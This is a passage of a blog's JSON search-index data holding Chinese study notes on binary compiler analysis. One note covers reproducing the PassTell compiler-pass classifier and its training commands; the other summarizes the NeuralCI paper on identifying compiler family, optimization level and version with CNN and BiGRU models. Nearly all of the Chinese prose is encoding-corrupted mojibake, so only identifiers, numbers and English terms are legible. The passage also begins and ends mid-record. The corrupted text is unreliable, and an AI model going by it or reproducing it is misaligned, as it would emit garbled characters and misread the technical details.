5)ã€‚ä½†æ˜¯ï¼Œåˆ†ç±»ç»“æœåº”è¯¥æ˜¯ç›¸ä¼¼çš„ï¼Œåº”è¯¥ä»ç„¶æ”¯æŒæˆ‘ä»¬åœ¨è®ºæ–‡ä¸­çš„å‘ç°ã€‚\nStatic Features è¦ä½¿ç”¨ç¬¬ 6.4 èŠ‚çš„é™æ€å’ŒåŠ¨æ€ç‰¹æ€§é‡ç°ç»“æœï¼Œè¯·è¿è¡Œ python passtell.py --train_csv data_dynamic.csv --dynamicã€‚è¯·æ³¨æ„ï¼Œåˆ†ç±»å™¨æ€»æ˜¯ä¼šè¦†ç›–ç»“æœç›®å½•\u0026rsquo; passtell_model \u0026lsquo;ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦ï¼Œè¯·åœ¨è¿è¡Œæ–°çš„å®éªŒä¹‹å‰å¤‡ä»½ä¹‹å‰çš„\u0026rsquo; passtell_model \u0026lsquo;ç›®å½•ã€‚ä¸ºäº†åªä½¿ç”¨ç« èŠ‚ 6.4 çš„é™æ€ç‰¹å¾ç”Ÿæˆç»“æœï¼Œå†æ¬¡è¿è¡Œåˆ†ç±»å™¨ï¼Œä¸å¸¦ --dynamic æ ‡å¿—ã€‚\nå¯¹é¢å¤–äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ†ç±» åœ¨ä½¿ç”¨ --train_csv é€‰é¡¹è®­ç»ƒæ¨¡å‹ä¹‹åï¼ŒPassTell å¯ä»¥ä½¿ç”¨ --tell é€‰é¡¹å¯¹ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåˆ†ç±» (ä¾‹å¦‚ï¼Œ\u0026rsquo; PassTellâ€”â€”tell my_binaryâ€”â€”output results. csv \u0026lsquo;)ã€‚è¾“å‡º CSV æ–‡ä»¶åŒ…æ‹¬å®ƒä¸ºæ¯ä¸ªå‡½æ•°æ£€æµ‹åˆ°çš„ç¼–è¯‘å™¨é€šé“ã€‚æ³¨æ„ï¼Œç”±äºåˆ†ç±»å™¨ä½¿ç”¨\u0026rsquo; objdump \u0026lsquo;æ¥åç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤äºŒè¿›åˆ¶æ–‡ä»¶å¿…é¡»åŒ…å«è°ƒè¯•ç¬¦å·ã€‚\nç»“æœè¯´æ˜ 6.2 çš„ç»“æœæ–‡ä»¶æ˜¯ pass_classification_results. csvã€‚æ–‡ä»¶ä¸­æ¯ä¸€è¡Œè¡¨ç¤ºä¸€ç§ pass ç§ç±»ï¼Œæ¯ä¸€è¡Œçš„å±æ€§æœ‰æ ·ä¾‹ä¸ªæ•°ï¼Œç²¾åº¦å¬å›ç‡å’Œæœ€é«˜çš„ 15 ä¸ªç‰¹å¾ï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºé€šè¿‡è¿™ 15 ä¸ªæˆ–è€…æ›´å¤šä¸ªç‰¹å¾æ¥åˆ¤å®šå‡½æ•°å±äºå“ªä¸ªä¼˜åŒ– pass 6.4 çš„å®éªŒç»“æœå’Œ 6.2 ç›¸åŒï¼Œå®ƒçš„ç›®çš„æ˜¯ä¸ºäº†æ¯”è¾ƒå¢åŠ äº†åŠ¨æ€ç‰¹å¾ï¼ˆå¯„å­˜å™¨å˜åŒ–ï¼‰å¯¹ç»“æœçš„å½±å“ï¼Œæ‰€ä»¥å°±æ˜¯å¯¹åŒæ ·çš„æ•°æ®è¿è¡Œä¸¤æ¬¡ç¨‹åºï¼Œä¸€æ¬¡åŠ åŠ¨æ€ç‰¹å¾ï¼Œä¸€æ¬¡ä¸åŠ ï¼Œç„¶åæ¯”è¾ƒ F1ã€‚\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/automatic-recovery-of-fine-grained-compiler-artifacts-at-the-binary-level%E5%A4%8D%E7%8E%B0/","summary":"[[Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Level]] GitHub åœ°å€ï¼šzeropointdynamics/passtell (github.com) æ•°æ®é›†ç»“æ„ passtell_dataset. tar. xz ï¼šPassTell å®éªŒä¸­ä½¿ç”¨çš„æ•°æ®é›†çš„å­˜æ¡£","title":"Automatic Recovery of Fine-grained Compiler Artifacts at the Binary Levelå¤ç°"},{"content":"ä¸­æ–‡è¯‘åï¼šåŸºäºé¢å‘åºåˆ—çš„ç¥ç»æ¨¡å‹çš„ç»†ç²’åº¦ç¼–è¯‘å™¨è¯†åˆ« ä½œè€…ï¼šZHENZHOU TIAN å•ä½ï¼š è¥¿å®‰é‚®ç”µå¤§å­¦ å›½å®¶ï¼š #ä¸­å›½ å¹´ä»½ï¼š #2021å¹´ æ¥æºï¼š #IEEE_ACCESS å…³é”®å­—ï¼š #ç¼–è¯‘ #ç¥ç»ç½‘ç»œ #äºŒè¿›åˆ¶ ä»£ç åœ°å€ï¼šzztian007/NeuralCI (github.com) ç¬”è®°å»ºç«‹æ—¶é—´ï¼š 2023-02-23 15:37\næ‘˜è¦ ç°æœ‰çš„å¤§å¤šæ•°æ–¹æ³•éƒ½é‡‡ç”¨åŸºäºç‰¹å¾åŒ¹é…æˆ–åŸºäºæœºå™¨å­¦ä¹ çš„ç­–ç•¥æ¥è¯†åˆ«ç¼–è¯‘å™¨ç»†èŠ‚ï¼Œåœ¨æ£€æµ‹ç²¾åº¦æˆ–ç²’åº¦ä¸Šéƒ½æœ‰é™åˆ¶ã€‚ åœ¨è¿™é¡¹å·¥ä½œä¸­ï¼Œæˆ‘ä»¬æå‡ºäº† NeuralCI (åŸºäºç¥ç»å»ºæ¨¡çš„ç¼–è¯‘å™¨è¯†åˆ«) æ¥æ¨æ–­è¿™äº›ç¼–è¯‘å™¨ç»†èŠ‚ï¼ŒåŒ…æ‹¬ç¼–è¯‘å™¨å®¶æ—ã€ä¼˜åŒ–çº§åˆ«å’Œå•ä¸ªå‡½æ•°çš„ç¼–è¯‘å™¨ç‰ˆæœ¬ã€‚ å…¶åŸºæœ¬æ€æƒ³æ˜¯å»ºç«‹é¢å‘åºåˆ—çš„ç¥ç»ç½‘ç»œæ¥å¤„ç†ä½¿ç”¨è½»é‡çº§å‡½æ•°æŠ½è±¡ç­–ç•¥ç”Ÿæˆçš„è§„èŒƒåŒ–æŒ‡ä»¤åºåˆ—ã€‚ ä¸ºäº†è¯„ä¼° NeuralCI çš„æ€§èƒ½ï¼Œæ„å»ºäº†ä¸€ä¸ªç”±ä» 19 ä¸ªå¹¿æ³›ä½¿ç”¨çš„ç°å®é¡¹ç›®ä¸­æ”¶é›†çš„ 854, 858 ä¸ªç‹¬ç‰¹å‡½æ•°ç»„æˆçš„å¤§å‹æ•°æ®é›†ã€‚ å®éªŒè¡¨æ˜ï¼ŒNeuralCI è¯†åˆ«ç¼–è¯‘å™¨æ—çš„å¹³å‡å‡†ç¡®ç‡ä¸º 98.6%ï¼Œ è¯†åˆ«ä¼˜åŒ–çº§åˆ«çš„å¹³å‡å‡†ç¡®ç‡ä¸º 95.3%ï¼Œ è¯†åˆ«ç¼–è¯‘å™¨ç‰ˆæœ¬çš„å¹³å‡å‡†ç¡®ç‡ä¸º 88.7%ï¼Œ è¯†åˆ«ç¼–è¯‘å™¨æ—å’Œä¼˜åŒ–çº§åˆ«çš„å¹³å‡å‡†ç¡®ç‡ä¸º 94.8%ï¼Œ åŒæ—¶è¯†åˆ«æ‰€æœ‰ç¼–è¯‘å™¨ç»„ä»¶çš„å¹³å‡å‡†ç¡®ç‡ä¸º 83.0%ï¼Œåœ¨æ£€æµ‹ç²¾åº¦å’Œå…¨é¢æ€§æ–¹é¢å‡ä¼˜äºç°æœ‰çš„åŠŸèƒ½çº§ç¼–è¯‘å™¨è¯†åˆ«æ–¹æ³•ã€‚ 1å¼•è¨€ ç¼–è¯‘å™¨è¯†åˆ«æ–¹é¢çš„ç ”ç©¶ç›¸å¯¹è¾ƒå°‘ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç±»:\nåŸºäºç­¾ååŒ¹é…çš„æ–¹æ³•[6]-[8] åœ¨ä¸€äº›é€†å‘å·¥ç¨‹å·¥å…·ä¸­å®ç°ï¼Œå¦‚ IDA[6]å’Œ PEiD[8]ï¼Œé€šè¿‡åŒ¹é…é€šç”¨ç­¾åå’Œåˆšæ€§ç­¾åçš„è¯­æ–™åº“æ¥æ‰§è¡Œæ•´ä¸ªç¨‹åºçº§åˆ«çš„è¯†åˆ«ã€‚ è¿™äº›æ–¹æ³•çš„ç¼ºç‚¹æ˜¯åœ¨æ„é€ è¶³å¤Ÿå¥½çš„ç‰¹å®šäºç¼–è¯‘å™¨çš„ç­¾åæ—¶éœ€è¦ä¸¥æ ¼çš„ä¸“ä¸šçŸ¥è¯†ï¼Œä»¥åŠå®ƒä»¬çš„ç²—æ ‡è¯†ç²’åº¦ã€‚ å’ŒåŸºäºå­¦ä¹ çš„æ–¹æ³•[27]-[29]ï¼Œ[39]ã€‚ åè€…å°†ç¼–è¯‘å™¨è¯†åˆ«å®šä¹‰ä¸ºæœºå™¨å­¦ä¹ ä»»åŠ¡ï¼Œè®­ç»ƒæ¨¡å‹ä»¥æ•è·ç‰¹å®šäºç¼–è¯‘å™¨çš„æ¨¡å¼ï¼Œå¹¶æ ¹æ®ä»¥å‰æœªè§è¿‡çš„äºŒè¿›åˆ¶æ–‡ä»¶æ¨æ–­ç¼–è¯‘å™¨ç»†èŠ‚ã€‚ å¯¹äºè¿™ç±»æ–¹æ³•ï¼Œè¯­æ³•æˆ–ç»“æ„ç‰¹å¾æ˜¯åŸºäºäººå·¥å®šä¹‰çš„æ¨¡æ¿æå–çš„ï¼Œä¾‹å¦‚ idioms[29]ï¼Œå®ƒæ˜¯å¸¦æœ‰é€šé…ç¬¦çš„çŸ­æŒ‡ä»¤åºåˆ—ï¼Œæˆ–è€… graphlets[28]ï¼Œå®ƒæ˜¯ CFG (æ§åˆ¶æµå›¾) ä¸­çš„å°å­å›¾ã€‚ä½œä¸ºå…¸å‹çš„åŸºäºç‰¹å¾å·¥ç¨‹çš„æ–¹æ³•ï¼Œå…¶æœ‰æ•ˆæ€§åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºä¸“å®¶å®šä¹‰çš„ç‰¹å¾æå–æ¨¡æ¿çš„è´¨é‡ï¼Œè€Œä¸“å®¶å®šä¹‰çš„ç‰¹å¾æå–æ¨¡æ¿éœ€è¦æ›´å¤šçš„é¢†åŸŸç‰¹å®šçŸ¥è¯†ã€‚ å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬ä¸ºå…¸å‹çš„å·ç§¯ç¥ç»ç½‘ç»œ (CNN) å’Œå¾ªç¯ç¥ç»ç½‘ç»œ (RNN) ç»“æ„æä¾›æ ‡å‡†åŒ–çš„æ±‡ç¼–æŒ‡ä»¤åºåˆ—ï¼Œä»¥è®­ç»ƒåˆ†ç±»æ¨¡å‹ï¼Œç”¨äºæ¨æ–­ç¼–è¯‘å™¨æ—ã€ä¼˜åŒ–çº§åˆ«å’Œç¼–è¯‘å™¨ç‰ˆæœ¬ã€‚æˆ‘ä»¬çš„ç›´è§‰æ˜¯åŸºäºè¿™æ ·çš„è§‚å¯Ÿ: å…±å‡ºç°çš„æŒ‡ä»¤åŠå…¶åœ¨çŸ­æŒ‡ä»¤åºåˆ—ä¸­çš„é¡ºåºå½¢æˆäº†è¶³å¤Ÿå¥½çš„ä¿¡å·ï¼Œå¯ä»¥åŒºåˆ†ä¸åŒçš„ç¼–è¯‘å™¨æˆ–ä¼˜åŒ–çº§åˆ«ï¼Œè¿™å¯ä»¥è¢«ç¥ç»æ¨¡å‹åŸºæœ¬ä¸Šæ•æ‰åˆ°ã€‚\n2 é—®é¢˜å®šä¹‰å’Œè®¾è®¡æ¦‚è¿° A é—®é¢˜æ¦‚è¿° ç•¥\nB é—®é¢˜å®šä¹‰ å®šä¹‰ 1ï¼šç»™å®šä¸€ä¸ªäºŒè¿›åˆ¶å½¢å¼çš„ä¸ªåˆ«å‡½æ•° fï¼Œå¹¶å‰¥ç¦»å…¶è°ƒè¯•å’Œç¬¦å·ä¿¡æ¯ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ç»„å­¦ä¹ æ¨¡å‹ M æ¥æ¨æ–­ç¼–è¯‘è¿™ä¸ªå‡½æ•°çš„ç¼–è¯‘å™¨è®¾ç½® Dã€‚ æ“ä½œå¯¹è±¡æ˜¯å•ä¸ªå‡½æ•° è®¾ç½® D åŒ…æ‹¬ç¼–è¯‘å™¨ç³»åˆ—ã€ä¼˜åŒ–çº§åˆ«ã€ç¼–è¯‘å™¨ç‰ˆæœ¬æˆ–å®ƒä»¬çš„ç»„åˆï¼ˆä¾‹å¦‚ç¼–è¯‘å™¨ç³»åˆ—å’Œä¼˜åŒ–çº§åˆ«éƒ½æœ‰ï¼‰ C è®¾è®¡æ¦‚è§ˆ è®­ç»ƒé˜¶æ®µ (ä¸Šå›¾) ç¬¬ä¸€æ­¥æ˜¯æ„å»ºä¸€ä¸ªç”±æ ‡è®°å‡½æ•°ç»„æˆçš„é«˜è´¨é‡æ•°æ®é›† ç¬¬äºŒæ­¥å°†æ¯ä¸ªåŸå§‹å‡½æ•°ä½œä¸ºè¾“å…¥ï¼Œå¹¶é€šè¿‡å‡½æ•°æŠ½è±¡æ¨¡å—ä¸­å®ç°çš„è½»é‡çº§æŠ½è±¡ç­–ç•¥è¾“å‡ºè§„èŒƒåŒ–çš„æŒ‡ä»¤åºåˆ—ã€‚ ç¬¬ä¸‰æ­¥å°†è¿™äº›å½’ä¸€åŒ–åºåˆ—åŠå…¶çœŸå®å€¼æ ‡ç­¾è¾“å…¥åˆ°åŸºäºç¥ç»ç½‘ç»œçš„åˆ†ç±»æ¨¡å—ä¸­ï¼Œè®­ç»ƒç¼–è¯‘å™¨è¯†åˆ«æ¨¡å‹ã€‚ æ£€æµ‹é˜¶æ®µ (ä¸‹å›¾)ã€‚ æ£€æµ‹é˜¶æ®µè¯»å…¥ä¸€ä¸ªå•ç‹¬çš„å‡½æ•°ï¼Œç”¨å‡½æ•°æŠ½è±¡å¤„ç†å®ƒï¼Œå¹¶åˆ©ç”¨è®­ç»ƒè¿‡çš„æ¨¡å‹æ¥äº§ç”Ÿé¢„æµ‹ã€‚ 3 å‡½æ•°æŠ½è±¡ å‡½æ•°çš„æŠ½è±¡è¡¨ç¤ºæ–¹æ³•åŒ…æ‹¬ä½¿ç”¨åŸå§‹å­—èŠ‚åºåˆ—ã€æ±‡ç¼–æŒ‡ä»¤åºåˆ—æˆ–æ§åˆ¶æµå›¾ å› ä¸ºæœ‰ç›¸å…³å·¥ä½œè¡¨æ˜çŸ­æ±‡ç¼–æŒ‡ä»¤åºåˆ—æˆåŠŸåœ°æ•è·äº†ç¼–è¯‘å™¨ç›¸å…³çš„ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨å‡½æ•°ä½“ä¸­çš„æ±‡ç¼–æŒ‡ä»¤åºåˆ—ä½œä¸ºæ¯ä¸ªå‡½æ•°çš„è¡¨ç¤ºã€‚ å‡½æ•° f è¡¨ç¤ºä¸ºä¸€ä¸ªåºåˆ— $Sf = {ins1, ins2ï¼ŒÂ·Â·Â·ï¼Œinsn}$ï¼Œå…¶ä¸­ n è¡¨ç¤ºå‡½æ•°å†…çš„æŒ‡ä»¤æ•° æ¯ä¸ªæ±‡ç¼–æŒ‡ä»¤ insi ç”±ä¸€ä¸ªæ“ä½œç  (å³åŠ©è®°ç¬¦) å’Œä¸€ä¸ªæœ‰åºçš„æ“ä½œæ•°åˆ—è¡¨ç»„æˆ åŒæ ·ï¼Œè¯¥åºåˆ—ç¡®ä¿ $âˆ€i, jâˆˆ[1, n]ï¼Œ addr (ins_j) \u0026gt; addr (ins_i)$ å¦‚æœ j \u0026gt; iï¼Œå…¶ä¸­ addr (insi) è¿”å› insi çš„åœ°å€ã€‚ ä½†æ˜¯åŒæ ·æœ‰ç›¸å…³å·¥ä½œè®¤ä¸ºç›´æ¥å¤„ç†åŸå§‹æ±‡ç¼–æŒ‡ä»¤æ˜¯ä¸æ˜æ™ºçš„ã€‚ æœ¬æ–‡å¸Œæœ›æ•è·åæ˜ ç¼–è¾‘å™¨ç»†èŠ‚çš„ç‰¹æ€§è€Œä¸æ˜¯å‡½æ•°åŠŸèƒ½ ä½¿ç”¨å‡½æ•°ä¸­å‡ºç°çš„æ‰€æœ‰æŒ‡ä»¤å¯èƒ½ä¼šè®©æˆ‘ä»¬æ²‰æµ¸åœ¨å¤ªå¤šçš„åŠŸèƒ½ç»†èŠ‚ä¸­ï¼Œè¿™å¯èƒ½ä¼šç›¸åº”åœ°å¢åŠ è¡¨ç¤ºå­¦ä¹ çš„å¤æ‚æ€§ï¼Œé™ä½æŒ‡ä»¤åµŒå…¥é˜¶æ®µçš„åµŒå…¥è´¨é‡ (å› ä¸ºä¿ç•™äº†å¤ªå¤šä¸åŒçš„æŒ‡ä»¤)ï¼Œä¹Ÿä¼šåˆ†æ•£åç»­ç¥ç»ç½‘ç»œè®­ç»ƒçš„æ³¨æ„åŠ›ã€‚å¦ä¸€æ–¹é¢ï¼Œå¯¹æŒ‡ä»¤çš„è¿‡åº¦è§„èŒƒåŒ–å°†å¼•å…¥å¤§é‡æ— æ„çš„äººä¸ºåå·®ï¼Œå¹¶å¯¼è‡´æŸäº›å¾®å¦™ä½†é‡è¦çš„ç‰¹å¾çš„ä¸¢å¤± å› æ­¤é€‰æ‹©ä½¿ç”¨è½»é‡çº§æŠ½è±¡ç­–ç•¥æ¥å¤„ç†åŸå§‹æŒ‡ä»¤ åŠ©è®°ç¬¦ä¿æŒä¸å˜ã€‚ æ“ä½œæ•°ä¸­çš„æ‰€æœ‰å¯„å­˜å™¨ä¿æŒä¸å˜ã€‚ æ“ä½œæ•°ä¸­çš„æ‰€æœ‰åŸºå†…å­˜åœ°å€éƒ½æ›¿æ¢ä¸ºç¬¦å· MEMã€‚ æ‰€æœ‰ç»å¯¹å€¼ä½äºç‰¹å®šé˜ˆå€¼ (åœ¨å½“å‰è®¾è®¡ä¸­è®¾ç½®ä¸º 5000) çš„å­¤ç«‹çš„ç«‹å³æ•°éƒ½ä¿æŒä¸å˜ï¼Œè€Œåœ¨æ‰€æœ‰å…¶ä»–æƒ…å†µä¸‹ï¼Œæ“ä½œæ•°ä¸­çš„ç«‹å³æ•°éƒ½ç”¨ç¬¦å· IMM ä»£æ›¿ã€‚ 4 è¯†åˆ«ç¼–è¯‘å™¨çš„ç¥ç»æ¨¡å‹ AæŒ‡ä»¤åµŒå…¥ å¯¹äºç¥ç»ç½‘ç»œçš„è¾“å…¥ï¼Œæˆ‘ä»¬éœ€è¦å°†æ±‡ç¼–æŒ‡ä»¤åºåˆ—è½¬åŒ–ä¸ºæ•°å€¼å‘é‡ é¦–å…ˆä½¿ç”¨è¯åµŒå…¥ä¸ºæ¯æ¡å”¯ä¸€çš„æŒ‡ä»¤åˆ†é…ä¸€ä¸ªå‘é‡ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šå¯¹æ•´ä¸ªæŒ‡ä»¤åºåˆ—å»ºæ¨¡å’Œè¡¨ç¤ºã€‚ ç‹¬çƒ­ç¼–ç å¤ªç¨€ç–ï¼Œåœ¨è®¡ç®—ä¸Šä¸å¯è¡Œï¼Œå¹¶ä¸”é€šå¸¸éœ€è¦ä¸åç»­çš„ç¥ç»ç½‘ç»œä¸€èµ·è”åˆå­¦ä¹ ï¼Œä½¿å¾—æ‰€å­¦ä¹ çš„å•è¯è¯­ä¹‰æ˜¾ç€å…·æœ‰ä»»åŠ¡ç‰¹å®šæ€§ã€‚ NeuralCI åˆ©ç”¨æµè¡Œçš„ skip-gram æ¨¡å‹ï¼Œä»¥ç‹¬ç«‹ä¸”æ— ç›‘ç£çš„æ–¹å¼å­¦ä¹ æ›´ç´§å‡‘çš„å‘é‡è¡¨ç¤ºï¼Œè¿™äº›å‘é‡è¡¨ç¤ºå…·æœ‰æŒ‡ä»¤å…±ç°å…³ç³»å’Œè¯æ±‡è¯­ä¹‰ï¼Œä»¥ä¾¿åœ¨å…¶ä»–äºŒè¿›åˆ¶åˆ†æä»»åŠ¡ä¸­å¯ä»¥é‡å¤ä½¿ç”¨å­¦ä¹ çš„å‘é‡ã€‚ å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬å°†æ¯ä¸ªåŸºæœ¬å—è§†ä¸ºä¸€ä¸ªå¥å­ï¼Œå¹¶å°†åŸºæœ¬å—ä¸­çš„æ¯ä¸ªè§„èŒƒåŒ–æŒ‡ä»¤è§†ä¸ºä¸€ä¸ªå•è¯ï¼Œå¹¶å°†æˆ‘ä»¬äºŒè¿›åˆ¶æ”¶é›†çš„æ‰€æœ‰åŸºæœ¬å—é¦ˆé€åˆ° skip-gram æ¨¡å‹ä¸­ï¼Œä»¥é€šè¿‡æœ€å°åŒ–è§‚å¯ŸæŒ‡ä»¤é‚»åŸŸï¼ˆåœ¨çª—å£ w å†…ï¼‰çš„æŸå¤±æ¥å­¦ä¹ æ¯ä¸ªå”¯ä¸€æŒ‡ä»¤çš„ d ç»´å‘é‡ï¼Œä»¥å…¶å½“å‰åµŒå…¥ä½œä¸ºæ¡ä»¶ã€‚skip-gram çš„ç›®æ ‡å‡½æ•°å¯ä»¥å®šä¹‰ä¸º æˆ‘ä»¬è®­ç»ƒåµŒå…¥æ¨¡å‹ 100 ä¸ª epochï¼Œå­¦ä¹ ç‡ä¸º 0.001ï¼Œä¸Šä¸‹æ–‡çª—å£å¤§å° w ä¸º 5ã€‚ B ç¥ç»ç½‘ç»œæ¨¡å‹ Skip-gram æ¨¡å‹çš„é™åˆ¶ï¼š\nä¸ºæ¯ä¸ªæŒ‡ä»¤åˆ†é…ä¸€ä¸ªé™æ€åµŒå…¥å‘é‡ï¼Œä¸æ˜¯ä¸Šä¸‹æ–‡æ„ŸçŸ¥ ç”±äºæŒ‡ä»¤åºåˆ—æ˜¯ä»å‡½æ•°ä¸­æŠ½è±¡å‡ºæ¥çš„ï¼Œå› æ­¤å®ƒä»¬å¯èƒ½ä¸ä»…äº«æœ‰æœ¬åœ°æŒ‡ä»¤ç›¸å…³æ€§ï¼Œè¿˜å¯èƒ½å…·æœ‰å…¨å±€æˆ– long-range æŒ‡ä»¤ä¾èµ–æ€§ã€‚ï¼ˆå•¥æ„æ€ï¼‰ éœ€è¦é åºåˆ—å­¦ä¹ æ¨¡å‹æ¥æ›´å¥½åœ°ä»æŒ‡ä»¤åºåˆ—ä¸­æ•è·è¡¨è¾¾ç¼–è¯‘å™¨ç‰¹å®šæ¨¡å¼å’Œç‰¹å¾çš„ä¿¡æ¯ä»¥è¿›è¡Œç¼–è¯‘å™¨è¯†åˆ«ã€‚\n1ï¼‰CNN CNN èƒ½å¤Ÿå…³æ³¨é‚£äº›åœ¨çŸ­åºåˆ—ä¸­é¢‘ç¹å‡ºç°çš„æŒ‡ä»¤ã€‚åœ¨æˆ‘ä»¬çš„æ¨¡å‹å…¬å¼ä¸­ï¼Œæˆ‘ä»¬è¿›ä¸€æ­¥åˆ©ç”¨äº†ä¸åŒçš„å†…æ ¸å¤§å°æ»¤æ³¢å™¨æ¥å…¨é¢æå–ä¸åŒæŒ‡ä»¤ gram ä¹‹é—´çš„ç›¸äº’ä½œç”¨çš„æ˜¾ç€ç‰¹å¾ï¼Œä»¥æ•æ‰ç¼–è¯‘å™¨çš„è¡Œä¸ºã€‚ åœ¨æŒ‡ä»¤åºåˆ—çš„åŸºç¡€ä¸Šï¼Œå°†æ¯ä¸ªæŒ‡ä»¤åºåˆ—é¦–å…ˆè½¬æ¢ä¸ºåŸå§‹ç‰¹å¾çŸ©é˜µ $A \\in R^{l \\times d}$ï¼Œå…¶ä¸­ $l$ æ˜¯åºåˆ—é•¿åº¦ï¼Œ$d$ æ˜¯æŒ‡ä»¤åµŒå…¥ç»´åº¦ã€‚ å…¶ä¸­ï¼Œ$e_i \\in R^d$ æ˜¯åºåˆ—ä¸­æŒ‡ä»¤ $ins_i$ çš„å¯¹åº”åµŒå…¥ã€‚ç„¶åï¼Œåœ¨å·ç§¯å±‚ä¸­ï¼Œé‡‡ç”¨äº† $k$ ä¸ªå½¢çŠ¶ä¸º $n \\times d$ çš„å·ç§¯æ»¤æ³¢å™¨å¯¹åŸå§‹ç‰¹å¾çŸ©é˜µ $A$ è¿›è¡Œå·ç§¯æ“ä½œï¼Œå¾—åˆ°æ–°çš„ç‰¹å¾çŸ©é˜µ $c \\in R(l-n+1) \\times k$ï¼Œå…¶ä¸­ $n$ è¡¨ç¤ºå·ç§¯æ ¸å¤§å°ã€‚ä¸ºäº†æå–ç‰¹å¾æ¨¡å¼çš„ä¸åŒè§†å›¾ï¼Œæˆ‘ä»¬ä½¿ç”¨å¤§å°åˆ†åˆ«ä¸º 2ã€3 å’Œ 4 çš„ä¸åŒå·ç§¯æ ¸å°† $A$ è¿›è¡Œå·ç§¯ï¼ˆåˆ†åˆ«ç±»æ¯”äº 2ã€3 å’Œ 4 ä¸ªæŒ‡ä»¤å…‹éš†ï¼‰ï¼Œç„¶åé€šè¿‡ 1D æœ€å¤§æ± åŒ–å±‚è¿›è¡Œç»´æ•°é™ä½ã€‚æœ€ç»ˆçš„è¡¨ç¤ºé€šè¿‡ç¨ å¯†å±‚è¿æ¥èµ·æ¥ï¼Œé¦ˆé€åˆ° softmax å±‚è¿›è¡Œç¼–è¯‘å™¨é¢„æµ‹ã€‚ åœ¨è¾“å…¥å±‚å’Œå·ç§¯å±‚ä¹‹é—´å¼•å…¥äº†ä¸€ä¸ªæ³¨æ„åŠ›å±‚ï¼Œå¼•å…¥è¿™æ ·ä¸€ä¸ªæ³¨æ„åŠ›å±‚çš„ç›´è§‰æ˜¯ä¸ºäº†æ•æ‰é•¿æœŸçš„ä¸Šä¸‹æ–‡ä¿¡æ¯å’Œéè¿ç»­æŒ‡ä»¤ä¹‹é—´çš„ç›¸å…³æ€§ã€‚ (è¿™éƒ¨åˆ†æ³¨æ„åŠ›æœºåˆ¶çœ‹ä¸æ‡‚ï¼ŒæŒ–ä¸ªå‘ï¼Œå…ˆå»è¡¥è¡¥è¯¾) å¯¹äºä¸¤ç§æ³¨æ„æœºåˆ¶ï¼ŒNeuralCI å°†ä»æ³¨æ„åŠ›å±‚è¾“å‡ºçš„å‘é‡ä¸åˆå§‹åµŒå…¥å‘é‡ä¸²è”ä¸ºæ–°çš„è¡¨ç¤ºå½¢å¼ï¼Œä»¥è¿›ä¸€æ­¥å¤„ç†å·ç§¯å’Œåç»­å±‚ã€‚ä¸ºäº†ç®€åŒ–èµ·è§ï¼Œæˆ‘ä»¬åœ¨å®éªŒè¯„ä¼°ä¸­ç”¨ NeuralBS CNNï¼ŒNeuralSD CNN å’Œ NeuralAD CNN æ¥è¡¨ç¤ºåŸºç¡€ CNNï¼Œå¸¦æœ‰ç¼©æ”¾ç‚¹ç§¯æ³¨æ„åŠ›çš„å¢å¼º CNN å’Œå¸¦æœ‰é™„åŠ æ³¨æ„åŠ›çš„å¢å¼º CNNã€‚\n2ï¼‰RNN RNN çš„ç‰¹ç‚¹åœ¨äºå¯ä»¥å­¦ä¹ é¡ºåºä¾èµ–æ€§ï¼Œå¯ä»¥æ•æ‰åˆ°æŒ‡ä»¤ä¹‹é—´çš„ long-range ä¾èµ–å…³ç³»ã€‚ é—¨æ§å¾ªç¯å•å…ƒç”¨äºè§£å†³ RNN çš„æ¢¯åº¦æ¶ˆå¤±/çˆ†ç‚¸é—®é¢˜ ä¸Šå›¾æ˜¯ RNN ç»“æ„ï¼Œé€šè¿‡ GRU å•å…ƒå¯¹è¾“å…¥çŸ©é˜µè¿›è¡Œè¯»å–ï¼Œåœ¨æ¯ä¸ªæ—¶é—´æ­¥ i ä¸Šç”Ÿæˆéšè—å‘é‡çŠ¶æ€ hi è¿›è¡Œå„ç§éçº¿æ€§å˜æ¢ã€‚ åœ¨ GRU çš„åŸºç¡€ä¸Šæ”¹è¿›çš„åŒå‘ GRUï¼ˆBiGRUï¼‰é€šè¿‡æ­£å‘å’Œåå‘çŠ¶æ€æ•è·å…ˆå‰å’Œæœªæ¥æ—¶é—´æ­¥é•¿ç‰¹å¾ï¼Œåˆ©ç”¨ç›¸äº’åè½¬çš„ä¸¤ä¸ª GRU å•å…ƒå¤„ç†åºåˆ—ã€‚æ•è·æŒ‡ä»¤åºåˆ—ä¸­çš„å‰å‘å’Œåå‘é¡ºåºä¾èµ–æ€§å’Œå…¨å±€ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚ åœ¨æ­£å‘å’Œåå‘è¯»å–æ•´ä¸ªè¾“å…¥åºåˆ—ä¹‹å A ç»“æ„å°†æœ€åçš„æ—¶é—´æ­¥çš„éšè—çŠ¶æ€ hi é€å…¥åç»­çš„å¯†é›†å±‚å’Œ softmax å±‚ B ç»“æ„å’Œ C ç»“æ„å¼•å…¥äº†æ³¨æ„åŠ›å±‚ï¼Œå…³æ³¨éƒ¨åˆ†ä¿¡æ¯æŒ‡ä»¤ï¼ˆå¯èƒ½æ›´é‡è¦çš„ç”¨äºç¼–è¯‘å™¨è¯†åˆ«ï¼‰è€Œä¸æ˜¯å¹³ç­‰åœ°å…³æ³¨æ‰€æœ‰æŒ‡ä»¤ã€‚B ä½¿ç”¨ CNN 